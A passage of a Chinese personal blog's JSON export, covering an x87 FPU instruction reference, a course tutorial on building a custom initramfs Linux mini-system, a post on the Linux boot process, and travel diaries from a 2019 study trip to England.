FLDZ 将0.0装入ST(0) 机器码 D9 EE FLD1 将1.0装入ST(0) 机器码 D9 E8 FLDPI 将π装入ST(0) 机器码 D9 EB FLDL2T 将ln10/ln2装入ST(0) 机器码 D9 E9 FLDL2E 将1/ln2装入ST(0) 机器码 D9 EA FLDLG2 将ln2/ln10装入ST(0) 机器码 D9 EC FLDLN2 将ln2装入ST(0) 机器码 D9 ED FLD real4 ptr mem 装入mem的单精度浮点数 机器码 D9 mm000mmm FLD real8 ptr mem 装入mem的双精度浮点数 机器码 DD mm000mmm FLD real10 ptr mem 装入mem的十字节浮点数 机器码 DB mm101mmm FILD word ptr mem 装入mem的二字节整数 机器码 DF mm000mmm FILD dword ptr mem 装入mem的四字节整数 机器码 DB mm000mmm FILD qword ptr mem 装入mem的八字节整数 机器码 DF mm101mmm FBLD tbyte ptr mem 装入mem的十字节BCD数 机器码 DF mm100mmm FST real4 ptr mem 保存单精度浮点数到mem 机器码 D9 mm010mmm FST real8 ptr mem 保存双精度浮点数到mem 机器码 DD mm010mmm FIST word ptr mem 保存二字节整数到mem 机器码 DF mm010mmm FIST dword ptr mem 保存四字节整数到mem 机器码 DB mm010mmm FSTP real4 ptr mem 保存单精度浮点数到mem并出栈 机器码 D9 mm011mmm FSTP real8 ptr mem 保存双精度浮点数到mem并出栈 机器码 DD mm011mmm FSTP real10 ptr mem 保存十字节浮点数到mem并出栈 机器码 DB mm111mmm FISTP word ptr mem 保存二字节整数到mem并出栈 机器码 DF mm011mmm FISTP dword ptr mem 保存四字节整数到mem并出栈 机器码 DB mm011mmm FISTP qword ptr mem 保存八字节整数到mem并出栈 机器码 DF mm111mmm FBSTP tbyte ptr mem 保存十字节BCD数到mem并出栈 机器码 DF mm110mmm FCMOVB ST(0),ST(i) &lt;时传送 机器码 DA C0iii FCMOVBE ST(0),ST(i) &lt;=时传送 机器码 DA D0iii FCMOVE ST(0),ST(i) =时传送 机器码 DA C1iii FCMOVNB ST(0),ST(i) &gt;=时传送 机器码 DB C0iii FCMOVNBE ST(0),ST(i) &gt;时传送 机器码 DB D0iii FCMOVNE ST(0),ST(i) !=时传送 机器码 DB C1iii FCMOVNU ST(0),ST(i) 有序时传送 机器码 DB D1iii FCMOVU ST(0),ST(i) 无序时传送 机器码 DA D1iii ---------- 三、比较指令 -------------------------------------------------------- FCOM ST(0)-ST(1) 机器码 D8 D1 FCOMI ST(0),ST(i) ST(0)-ST(1) 机器码 DB F0iii FCOMIP ST(0),ST(i) ST(0)-ST(1)并出栈 机器码 DF F0iii FCOM real4 ptr mem ST(0)-实数mem 机器码 D8 mm010mmm FCOM real8 ptr mem ST(0)-实数mem 机器码 DC mm010mmm FICOM word ptr mem ST(0)-整数mem 机器码 DE mm010mmm FICOM dword ptr mem ST(0)-整数mem 机器码 DA mm010mmm FICOMP word ptr mem ST(0)-整数mem并出栈 机器码 DE mm011mmm FICOMP dword ptr mem ST(0)-整数mem并出栈 机器码 DA mm011mmm FTST ST(0)-0 机器码 D9 E4 FUCOM ST(i) ST(0)-ST(i) 机器码 DD E0iii FUCOMP ST(i) ST(0)-ST(i)并出栈 机器码 DD E1iii FUCOMPP ST(0)-ST(1)并二次出栈 机器码 DA E9 FXAM ST(0)规格类型 机器码 D9 E5 ---------- 四、运算指令 -------------------------------------------------------- FADD 把目的操作数 (直接接在指令后的变量或堆栈缓存器) 与来源操作数 (接在目的操作数后的变量或堆栈缓存器) 相加，并将结果存入目的操作数 FADDP ST(i),ST 这个指令是使目的操作数加上 ST 缓存器，并弹出 ST 缓存器，而目的操作数必须是堆栈缓存器的其中之一，最后不管目的操作数为何，经弹出一次后，目的操作数会变成上一个堆栈缓存器了 FIADD FIADD 是把 ST 加上来源操作数，然后再存入 ST 缓存器，来源操作数必须是字组整数或短整数形态的变数 FSUB 减 FSUBP FSUBR 减数与被减数互换 FSUBRP FISUB FISUBR FMUL 乘 FMULP FIMUL FDIV 除 FDIVP FDIVR FDIVRP FIDIV FIDIVR FCHS 改变 ST 的正负值 FABS 把 ST 之值取出，取其绝对值后再存回去。 FSQRT 将 ST 之值取出，开根号后再存回去。 FSCALE 这个指令是计算 ST*2^ST(1)之值，再把结果存入 ST 里而 ST(1) 之值不变。ST(1) 必须是在 -32768 到 32768 (-215 到 215 )之间的整数，如果超过这个范围计算结果无法确定，如果不是整数 ST(1) 会先向零舍入成整数再计算。所以为安全起见，最好是由字组整数载入到 ST(1) 里。 FRNDINT 这个指令是把 ST 的数值舍入成整数，FPU 提供四种舍入方式，由 FPU 的控制字组(control word)中的 RC 两个位决定 RC 舍入控制 00 四舍五入 01 向负无限大舍入 10 向正无限大舍入 11 向零舍去 ================================================================================","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"https://liuyi12138.github.io/tags/逆向/"}]},{"title":"Linux小系统外围文件系统定制","slug":"Linux小系统外围文件系统定制","date":"2019-09-17T01:23:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/09/17/Linux小系统外围文件系统定制/","link":"","permalink":"https://liuyi12138.github.io/2019/09/17/Linux小系统外围文件系统定制/","excerpt":"17级种子班Linux初步课程step1","text":"17级种子班Linux初步课程step1 基本思路 从Linux启动过程这篇博客的叙述中我们了解到在Kernel内核启动后会解压/boot/initramfs.img到根目录下作为临时文件系统来装载一些模块，之后再重新挂载真正的文件系统 我们需要做的则是自己重建一个initramfs.img镜像文件让操作系统启动我们的小系统，从而达到自己定制外围文件系统的目的，也为下一步定制内核打下基础 基本思路 V0.5实验要求 利用initrd.img机制，建立一个简单文件系统（v0.5版本），使得内核用该文件系统启动后可以直接获得一个shell 实验分析 方案1：直接修改系统的initrd.img解压出的目录下的init文件，在switch root之前先启动bash 方案2：重新建立一个文件夹加入自己需要的模块 个人推荐方案2，后期会有系统大小要求，方案1不便于裁剪 实验实现 在/boot/grub/grub.conf文件中添加一个开机可选项 grub.conf 方案1：如下图 方案1 方案2： 文件结构： bin/ 常用命令目录 init 启动脚本 lib64/ 依赖库 我们需要向bin/目录下添加bash、ls、rm、cp等等基础命令，并在lib64中添加相应的依赖库 使用ldd命令可查询命令所需依赖 建议自己写脚本来实现依赖添加 使用find . | cpio -H newc -o | gzip &gt; /boot/initrd.img命令来将我们自己的文件系统重新打包为镜像 自动添加依赖脚本 1234567891011cp /bin/$1 bin/ldd /bin/$1 &gt; /boot/test/lib.txtfor line in `cat /boot/test/lib.txt`doif [ $&#123;line:0:6&#125; == \"/lib64\" ]then echo $line cp $line lib64/fidone V0.55实验要求 拥有可以挂载原系统能力的(手动挂载) 实验分析 我们需要挂载文件系统和读取硬盘因此需要加载一些moudles mod相关常用命令： lsmod //查看系统中所有已经被加载了的所有的模块以及模块间的依赖关系 modinfo //获取模块信息 insmod / modprobe //加载驱动 rmmod //卸载驱动 对照解压出的小系统目录加入我们需要的modules(/lib/modules) 实验实现 加入mod常用的命令道bin并参照V0.5加入依赖(并不是所有的命令都在bin下，可用whereis命令查看命令所在地址) 我加入的modules： ext4 jbd2 mbcache sd_mod crc_t10dif sr_mod cdrom mptspi mptscsih mptbase scsi_transport_spi insmod的时候注意依赖关系来决定加载顺序 init文件内容 V0.55 V0.6实验要求 拥有管理设备能力（udev） 自动挂载modules 实验分析 udevd的规则文件在/lib/udev/目录下，配置文件在/etc/udev/目录下，同时还需要/etc/nsswitch.conf配置的名称服务交换，其依赖的库为/lib目录下以libnss开头的文件，将上述文件拷贝到我们的目录下，然后使用/sbin/start_udev命令可以启动udevd服务 实验实现 注意modules文件夹下的规范，一定要完全按照系统原来的文件夹规范来，不然udev可能找不到 还需要将/lib/modules/xxxx.x86_64目录下的各种配置文件拷贝到我们的目录下 init文件内容 123456789101112131415#!/bin/bashexport PATH=/sbin:/bin:/usr/bin:/usr/sbin:$PATH# mount some important thingsmount -t proc proc /proc/ &gt;/dev/null 2&gt;&amp;1mount -t sysfs sysfs /sys/ &gt;/dev/null 2&gt;&amp;1mknod /dev/sda2 b 8 2/sbin/start_udevmount -t ext4 /dev/sda2 /root//bin/bash V0.7实验要求 拥有login登录能力（多窗口） 实验分析 login程序基于认证体系PAM，配置文件在/etc/pam.d/目录下以及/etc下的security和securetty，相关库文件有/lib64/security/及其依赖的库文件；login还涉及用户组管理/bin/chgrp、/bin/chown、/bin/chmod等，保存用户名的文件/etc/passwd、/etc/group，用户密码文件为/etc/shadow。 实验实现 自动循环添加/lib64/security/依赖库脚本 1234567891011121314for file in /boot/test/init1/lib64/security/*;do echo $file ldd $file &gt; /boot/test/lib.txt for line in `cat /boot/test/lib.txt` do if [ $&#123;line:0:6&#125; == \"/lib64\" ] then echo $line cp $line lib64/ fi donedone 添加完这些文件后调起login即可 跳转窗口使用/sbin/mingetty /dev/ttyN &amp; login &gt; /dev/ttyN 2&gt; /dev/ttyN &lt; /dev/ttyN &amp; V0.9实验要求 达到由/sbin/init管理的小系统原型 实验分析 V0.9主要是前几个版本的集成，主要难点是将系统交给/sbin/init管理所以很难调试和发现错误 而/sbin/init的加载过程详解可以参考Linux启动过程详解 实验实现 需要拷贝的配置文件有： /etc/inittab //配置默认运行级别 /etc/init/rcS.conf 加载rc.sysinit脚本，//完成系统初始化任务 /etc/init/rc.conf //兼容脚本，负责各运行级别的调用处理 /etc/init/rcS-sulogin.conf //为单用户模式启动/sbin/sushell环境 /etc/init/control-alt-delete.conf //控制终端下的Ctrl+Alt+Del热键操作 /etc/init/start-ttys.conf //配置tty终端的开启数量、设备文件 /etc/sysconfig/init //控制tty终端的开启数量、终端颜色方案 /etc/init/tty.conf //控制tty终端的开启 启动/etc/rc.sysinit后将remount_needed函数的调用注释掉，防止挂载主系统根目录 其他的问题根据报错信息一点点调试即可 init文件内容12345678#!/bin/bashexport PATH=/sbin:/bin:/usr/bin:/usr/sbin:$PATH# mount some important thingsmount -t proc proc /proc/ &gt;/dev/null 2&gt;&amp;1mount -t sysfs sysfs /sys/ &gt;/dev/null 2&gt;&amp;1exec /sbin/init 至此linux小系统的外围文件系统已经完成了，在此鸣谢某不知名学长(应该是)留下的参考资料，接下来定制内核也要好好加油嗷","categories":[{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/tags/Linux/"}]},{"title":"Linux启动过程","slug":"Linux启动过程","date":"2019-09-04T06:47:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2019/09/04/Linux启动过程/","link":"","permalink":"https://liuyi12138.github.io/2019/09/04/Linux启动过程/","excerpt":"17级种子班Linux初步课程step0","text":"17级种子班Linux初步课程step0 大体启动流程 Start 具体流程MBR引导加载(Boot Loader) boot loader将控制权交给对应操作系统的loader，让它负责去启动操作系统(OS Loader) Boot Loader grub(Linux的Loader使用的就是grub) Linux所在分区的boot sector就是存放着stage1文件的内容，同时默认Linux启动的话，也需要把stage1中的引导代码安装到MBR中的boot loader中 stage1完成了主程序的引导后，主引导程序开始加载配置文件，但是加载这些配置文件之前需要有文件系统的支持，GRUB的内置文件系统其实是依靠stage1_5那些文件定义的，而且有不同文件系统的stage1_5(/boot/grub) 而后开始读取stage2开始真正地读取配置文件grub.conf,解析/boot/grub/grub.conf文件 加载系统内核kernel MBR将内核文件（代码）载入物理内存中执行，内核就是/boot/vmlinuz.x86_64，观察该文件，发现这是一个压缩镜像文件,控制权转交给内核后，内核重新检测各种硬件信息 这时候内核还没有文件系统的概念，没有文件系统就没办法挂载根目录，想要挂载根目录就需要相应的模块支持，内核需要文件系统来加载提供这些程序功能的模块(鸡与蛋的问题) 所以先采用载入临时根文件系统(/boot/initramfs.img)把其解压成根目录，然后内核就可以在这个虚拟的根文件系统上加载驱动程序，之后释放根文件系统，最后开始正常的启动过程。 initramfs.img解压 1234567891011# file initramfs-2.6.32-431.el6.x86_64.img //检查initramfs文件类型//initramfs-2.6.32-431.el6.x86_64.img: gzip compressed data, from Unix, last modified: Wed Sep 4 01:05:16 2019, max compression//所以需要先用gzip解压# mv initramfs-2.6.32-431.el6.x86_64.img initramfs-2.6.32-431.el6.x86_64.img.gz //gzip解压文件必须以.gz后缀# gzip -d initramfs-2.6.32-431.el6.x86_64.img.gz# file initramfs-2.6.32-431.el6.x86_64.img //再次检查文件类型//initramfs-2.6.32-431.el6.x86_64.img: ASCII cpio archive (SVR4 with no CRC)//查看需要借助cpio命令# mkdir init# cd init# cpio -id &lt; initramfs-2.6.32-431.el6.x86_64.img//解压到init目录下 解压之后的内容类似于真正/目录下内容，这是因为这是一个最小化的Linux根文件系统。内核就是先把这个文件展开，形成一个虚拟文件系统(在/目录下)，内核借虚拟文件系统装载必要的模块，完成后释放该虚拟文件系统并挂载真正的根目录 initramfs 启动init 内核完成硬件检测和加载模块后，内核会呼叫第一个进程，就是/sbin/init，至此内核把控制权交给init进程 初始化配置文件/etc/inittab决定操作系统的runlevel inittab 系统初始化脚本/etc/rc.d/rc.sysinit设置主机名，挂载/etc/fstab中的文件系统，修改/etc/sysctl.conf 的内核参数等各项系统环境 开机启动信息存放在/var/log/dmesg中 /etc/rc.d/rc脚本","categories":[{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://liuyi12138.github.io/tags/Linux/"}]},{"title":"英国游学笔记——初识剑桥","slug":"英国游学笔记——初识剑桥","date":"2019-08-12T12:41:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/08/12/英国游学笔记——初识剑桥/","link":"","permalink":"https://liuyi12138.github.io/2019/08/12/英国游学笔记——初识剑桥/","excerpt":"Day8，抵达剑桥，稍作休息后下午在剑河撑船，从河上看到了康桥，晚上入住河景房，异常舒适，明天就要开始学习了，之后记笔记可能不会那么勤。","text":"Day8，抵达剑桥，稍作休息后下午在剑河撑船，从河上看到了康桥，晚上入住河景房，异常舒适，明天就要开始学习了，之后记笔记可能不会那么勤。 剑桥 我们来到了剑桥的圣约翰学院，并将在这里学习两周。圣约翰学院是剑桥的几个大院之一，历史悠久，所以建筑非常古典而美丽。 8.13.1 下午我们在剑河泛舟，剑河几乎是环绕整个剑桥小镇的一条河流，连接着剑桥的各学院。几乎每一个与剑河接壤学院都会在剑河上建上一座桥梁，所以一路下来我们见到了铁桥、木桥和数不尽的石桥，包括那座有名的康桥。 8.13.2 第一天入住剑桥有些疲倦，之后上课和我想的也不太一样，在一个狭小的教室(没有桌子没法摸鱼www)，每节课都要写总结感觉会比较辛苦。之后如果没有什么大事也就不会每天记下行程了。","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"}]},{"title":"英国游学笔记——白金汉宫","slug":"英国游学笔记——白金汉宫","date":"2019-08-11T10:04:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/08/11/英国游学笔记——白金汉宫/","link":"","permalink":"https://liuyi12138.github.io/2019/08/11/英国游学笔记——白金汉宫/","excerpt":"Day7，在伦敦的最后一天，去了白金汉宫看了换岗仪式，在旁边的公园看到了可爱的小松鼠！下午去购物随便逛了一会很早就回宿舍了，略做修整明天将启程去剑桥学习了。","text":"Day7，在伦敦的最后一天，去了白金汉宫看了换岗仪式，在旁边的公园看到了可爱的小松鼠！下午去购物随便逛了一会很早就回宿舍了，略做修整明天将启程去剑桥学习了。 白金汉宫 在英国至今为止拍得最好的照片之一，依旧是典型的英国式建筑，在阳光下很有艺术感。 8.12.4 在等待换岗期间前往哨兵站看皇室哨兵，真的很帅！但仔细看发现他们都在睡觉，毕竟每天要这么站着供游客参观真的很boring，求哨兵们的心理阴影面积2333 8.12.2 在去往哨兵站的路上经过一个公园，兼职就是一个动物园！第一次近距离看到可爱的小松鼠真的异常兴奋，拍了一堆照片~ 8.12.3 看换岗仪式真的是人山人海，骑着白马的骑士开道，乐队和哨兵们紧随其后，有条不紊地前往白金汉宫，气势恢宏。 听说每年白金汉宫对外展览能给英国皇室带来40万英镑的收入，不愧是资本主义国家，厉害。 8.12.1 在伦敦的旅途到今天为止就全部结束了，虽然很累但异常充实，明天就要开始新的旅程，在剑桥学习也要加油鸭！","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"}]},{"title":"英国游学笔记——牛津城市探访","slug":"英国游学笔记——牛津城市探访","date":"2019-08-10T15:35:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/08/10/英国游学笔记——牛津城市探访/","link":"","permalink":"https://liuyi12138.github.io/2019/08/10/英国游学笔记——牛津城市探访/","excerpt":"Day6，去了牛津游览，下午去了购物街花了好多钱嗷","text":"Day6，去了牛津游览，下午去了购物街花了好多钱嗷 牛津 牛津的建筑特色与伦敦还是略有差别，显得更古老而庄重，其中有教堂，博物馆，庄园，钟楼等等，最古老的建筑可追溯到中世纪。 但牛津的大多数古老建筑都是收费了，在2-4磅不等，显然是成为了旅游城市，我在想是不是和武汉一样，本地人都不去黄鹤楼，而在牛津本地人都不去这些古老建筑。所以我们并没有观光过多景点，只是在外围拍照(就是因为贫穷) 8.11.1 基督教堂 我们游览时间最长的是牛津大学某学院的一个教堂，这个教堂也正是霍格沃茨取景地，不得不说哈利波特在英国是一个大IP，只要是与之沾边的地方都会有纪念品店。 教堂的文化我也不是很懂不过教堂的玻璃窗倒是十分美丽~与我在刺客信条中看到的如出一辙。 8.11.2 比斯特购物村 下午去了购物村shopping，每人拿到一个九折券，加上退税可以说是十分实惠。村里基本上各种大牌都有，而且听同行的购物狂们将比国内便宜许多。 不过一定要记得要退税单，另外有一个小坑，如果付现金的话，退税时会收很高的服务费，建议用卡支付。","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"}]},{"title":"英国游学笔记——英国国家美术馆+国王十字车站","slug":"英国游学笔记——英国国家美术馆+国王十字车站","date":"2019-08-09T12:04:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/08/09/英国游学笔记——英国国家美术馆+国王十字车站/","link":"","permalink":"https://liuyi12138.github.io/2019/08/09/英国游学笔记——英国国家美术馆+国王十字车站/","excerpt":"Day5，a free day! 一天的闲逛+购物，晚上回来的很早在宿舍狼人杀，难得的放松时间","text":"Day5，a free day! 一天的闲逛+购物，晚上回来的很早在宿舍狼人杀，难得的放松时间 英国国家美术馆 其实我并不是很pick美术馆嗷，毕竟欣赏不来但还是去看了 8.10.4 最有名的应该是莫奈的睡莲池和梵高的向日葵(连我都知道肯定非常有名)毕竟是国家美术馆，B格挺高的。遗憾的是梵高的向日葵被借出了，不过我很喜欢下图中的雪地画，十分逼真。 8.10.2 国王十字车站 真的是哈迷打卡之地，人超级多，车站还在用，建筑风格也非常nice。 8.10.5 哈利波特纪念品店在车站一脚(9 3/4站台旁边)，9 3/4站台的手推车比我想的还是差一点嗷，不过就算是10磅天价排队的人依旧超级多，不得不说哈迷遍布天下(还有钱),不过在旁边偷拍似乎不花钱嗷嘻嘻嘻 8.10.3 纪念品店比较平价，这和中国坐地起价有很大不同，昨天在Bletchely公园也注意到了这个问题，旅游景点的物价并没有高的离谱，大概只是略微高了那么一丢丢。 8.10.7 写了几天blog上传了许些照片再一看我的gayhub仿佛自己的学术水平又上升了不少，再接再厉嗷23333 github","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"}]},{"title":"英国游学笔记——Bletchley公园探访+歌剧鉴赏","slug":"英国游学笔记——Bletchely公园探访+歌剧鉴赏","date":"2019-08-08T15:34:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/08/08/英国游学笔记——Bletchely公园探访+歌剧鉴赏/","link":"","permalink":"https://liuyi12138.github.io/2019/08/08/英国游学笔记——Bletchely公园探访+歌剧鉴赏/","excerpt":"Day4，just so so的一天，白天乘车去了Bletchley公园，晚上去看了歌剧阿拉丁神灯。","text":"Day4，just so so的一天，白天乘车去了Bletchley公园，晚上去看了歌剧阿拉丁神灯。 Bletchely公园 从伦敦市区驶往郊区，沿途的风景极好，与中国恰好相反，英国乡村给人的感觉比城市更好，及其干净，空旷，整洁。 8.9.1 Bletchley公园是二战时期英国破解德行密码的大后方，公园并不大但十分惬意，简单地逛完一圈后大家都坐在椅子上聊天打趣。 8.9.2 歌剧鉴赏 人生中第一次听歌剧，本以为会非常无趣却是出乎意料的震撼。故事还是那个熟悉的故事，但在故事中串上高歌与交响乐，给人一种奇特的感觉。看着台上的演员舞蹈时想到了中国的少数名族舞蹈，确实有不少相似之处，但歌剧中的舞蹈与舞台特效，音乐结合，再加上有一定故事性，就不像国内的舞蹈表演那么无趣，不过还是睡着了一小会。 歌剧院不让用手机所以没有拍照(中途用手机看时间还被警告了)，不过好像同行者有人偷偷拍到了，等get到照片再补上，视觉效果真的很棒。 8.9.3 补图——歌剧阿拉丁神灯 8.10.1","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"}]},{"title":"英国游学笔记——帝国理工学院探访","slug":"英国游学笔记——帝国理工学院探访","date":"2019-08-07T15:06:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/08/07/英国游学笔记——帝国理工学院探访/","link":"","permalink":"https://liuyi12138.github.io/2019/08/07/英国游学笔记——帝国理工学院探访/","excerpt":"旅行Day2，上午探访了Imperial College London，下午简单探访KCL后回旅馆休息，晚上吃了奇奇怪怪的sandwish后排队1小时终于在Sky Garden看到了伦敦全景~","text":"旅行Day2，上午探访了Imperial College London，下午简单探访KCL后回旅馆休息，晚上吃了奇奇怪怪的sandwish后排队1小时终于在Sky Garden看到了伦敦全景~ Imperial College London探访 一早去往帝国理工学院听了一场学院介绍，感觉练了一个小时听力 :( ,在一个帅气的说着我听不懂的英文的中国小哥哥的带领下逛了帝国理工学院，非常现代化&amp;大气，但在伦敦上大学真的过于昂贵，一周开支200磅+，不过健身房巨便宜，40磅/年。 知道了伦敦只有四所大学但都十分优秀嗷，不过我在想武汉有100+所大学诶，武汉是不是比伦敦要大23333 8.7.11 Group帝国理工合影留恋 8.7.12 sandwish The difference between sandwish and sandwish is so big! 吃了一餐欢乐的晚餐，明明都是三明治可是为什么一个是一片面包+蔬菜,一个是鸡肉卷??? 8.7.15 恰strange sandwich的我也是一个cute boy嗷 8.7.16 建筑 伦敦的建筑真的十分富有美学！各式各样的建筑层出不觉，虽然每天走到腿疼但总能看到不一样的风景。 8.7.13 Sky Garden！ 排了一个小时队才上到了伦敦的制高点之一，在傍晚俯瞰伦敦，it is so butiful！但并不能拍出很好的效果，美丽的风景还是得看在眼里放在心里鸭~ Sky Garden上的酒吧也very nice，比较平价，在城市上空喝啤酒是一个非常棒的体验！ 8.7.14","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"}]},{"title":"英国游学笔记——伦敦城市探访","slug":"英国游学笔记——伦敦城市探访","date":"2019-08-06T14:40:16.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2019/08/06/英国游学笔记——伦敦城市探访/","link":"","permalink":"https://liuyi12138.github.io/2019/08/06/英国游学笔记——伦敦城市探访/","excerpt":"旅行第一天，在KCL吃过早餐，上午拜访了大英博物馆，下午在英国街头游荡~，晚上散步去了Tower Bridge，很累但是很充实嗷","text":"旅行第一天，在KCL吃过早餐，上午拜访了大英博物馆，下午在英国街头游荡~，晚上散步去了Tower Bridge，很累但是很充实嗷 美食 对于我们中国人来说，英国的食物真的称不上美味，毕竟是一个只会煮和炸的国度。 一大早在KCL餐厅吃早餐，和我想象中的英式早餐差不多，面包牛奶水果咖啡，中规中矩，能吃饱但味道确实不如中式早餐。 午餐和晚餐过于昂贵，午餐吃了日料海鲜面，花了15磅，折合人民币大概130元，味道一般，有趣的是店主是中国人，店员多多少少都会一点中文，所以体验还不错。晚餐去了China Town吃心心恋恋的扬州炒饭，并不太贵只要10磅不到，但服务员仿佛并没有找零的习惯，收过钱后就一个劲地thx u，于是乎拿走了两磅多的小费···。 在英国吃饭堂食是要加服务费的，一般在10%左右，看到同学们吐槽一顿晚餐被收取了50rmb服务费也就没那么心疼我两磅的小费了23333 8.7.4 城市探访 上午去了大英博物馆参观，感觉并不怎么满意，毕竟一方面英国历史并不长，所以博物馆大多数展出其他国家的文物，其中埃及馆最大；另一方面是英文确实不通所以看不懂hhhhh 吃完午饭就一直在伦敦街头闲逛，千禧之轮转速好慢嗷，大本钟还在装修中，英国的建筑真的好美，随手一拍都十分好看，一下午晃晃悠悠拍了不少照片。 8.7.1 Tower Bridge(伦敦塔桥) 晚上7点回到宿舍就是自由活动时间了，小睡了一个小时还迷迷糊糊就被拉出去压马路。走了半小时左右就到了泰晤士河边看到了Tower Bridge十分壮观，晚上很多人在桥边广场上运动，可惜并没有广场舞大妈，一行人在桥边拍了不少丑照后乘兴而归。 8.7.3 Our Group 在千禧之轮前的合照，慢慢喜欢上这个Group，里面的人超有才说话又好听~ 8.7.2","categories":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/categories/城游/"}],"tags":[{"name":"城游","slug":"城游","permalink":"https://liuyi12138.github.io/tags/城游/"},{"name":"英国游学","slug":"英国游学","permalink":"https://liuyi12138.github.io/tags/英国游学/"}]},{"title":"英国游学笔记——启程","slug":"英国游学笔记——启程","date":"2019-08-05T22:58:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2019/08/06/英国游学笔记——启程/","link":"","permalink":"https://liuyi12138.github.io/2019/08/06/英国游学笔记——启程/","excerpt":"背景2019年暑假，我就要成为一名大三学生了，在求学之路上走了好些年，之后也没有出国留学的打算，所以就抓住了这次宝贵的机会，参与了学院的暑期出国项目，大概人生中不会再有这种出国学习的机会，故以文记之。","text":"背景2019年暑假，我就要成为一名大三学生了，在求学之路上走了好些年，之后也没有出国留学的打算，所以就抓住了这次宝贵的机会，参与了学院的暑期出国项目，大概人生中不会再有这种出国学习的机会，故以文记之。 启程 启程前三天一直在收拾行李，对我来说出国带来了太多的新鲜感，仿佛是要把整个宿舍都搬到英国去才能安心一般。 上午十点上车，十二点到机场，安检，过海关，随便吃点东西，上飞机，一切都紧凑而有条不紊。 这是我人生中第一次去其他学校交流学习，第一次坐飞机，第一次出国，太多的第一次总是让人很兴奋。我第一次知道原来飞机上这么狭窄跟电视上好像不太一样，第一次感受到飞机起落的超重与失重，第一次玩飞机上的小平板，第一次吃上飞机餐，第一次准备倒时差······ 在天上 飞行在11582米的高空上，窗外只有一望无垠的云朵，耳边是风的呼啸声，仿佛灵魂都被放空了。 8.6.1 此刻我们正在俄罗斯广袤国土的上空，西伯利亚真是个美丽的名字，让人觉得特别圣洁，空旷，单纯，同如此刻窗外零下五十八度的低温一般让人为之一振 。我在想，在这片国土上的人们，是不是过着与我们截然不同的生活，不用考试，不打游戏，就单纯地生活在这篇寒冷的土地上。每每想到这个我就莫名地兴奋，比去英国那个繁华国度还要兴奋，因为已经有太多人向我叙述过英国的风土人情，我只担心着去那里会不会不通语言，会不会跟不上课程。但在这里，没有人告诉过我西伯利亚人是怎么生活的，我可以尽情想象，想象那里的人每天都穿着厚厚的毛皮大衣，坐着狗拉雪橇，出门猎狼，为一天的口粮奔波。或许有人会告诉我不是这样，西伯利亚人也每天上学，上班，奔波劳累，他们也有高楼大厦，有不夜的都市。但我总觉得不是这样的，我更愿意去相信世界是那么的多姿多彩，总有人过着我想象不到的生活。 8.6.2 飞机餐真的很棒，大概是之后大半个月最后一次吃到米饭了。 8.6.3 飞机在云海间逐渐降落，像一朵朵棉絮一般，真的很美，当飞机穿过云朵的时候仿佛起雾了一般，如入仙境 8.6.4 抵达 当地下午6点，经过了11个小时的飞行我们终于抵达了伦敦，当晚入住了KCL(伦敦国王学院)，宿舍很舒适。 晚上去炸鸡店买了晚饭，一个汉堡一包薯条一罐快乐水4磅，也不算贵，味道也还凑合，不至于难以下咽。 苏打水6毛一瓶很便宜但是很难喝，英国很干燥需要多喝水，很庆幸带来了烧水壶。 8.6.7 倒时差很痛苦，早晨四五点大家都陆续醒来，这时在国内大概是中午12点，看看窗外天已经亮了。仿佛气候宜人，这里夏天也只有24°，只恨没多带两件外套。 此刻我正坐在桌前记录着到达第一天的兴奋，今天我们将参观大英博物馆，大概是不能听懂的，不过去凑个热闹捧个人场也是极好的。 8.6.5 补一张朋友圈偷来的图，清晨的KCL 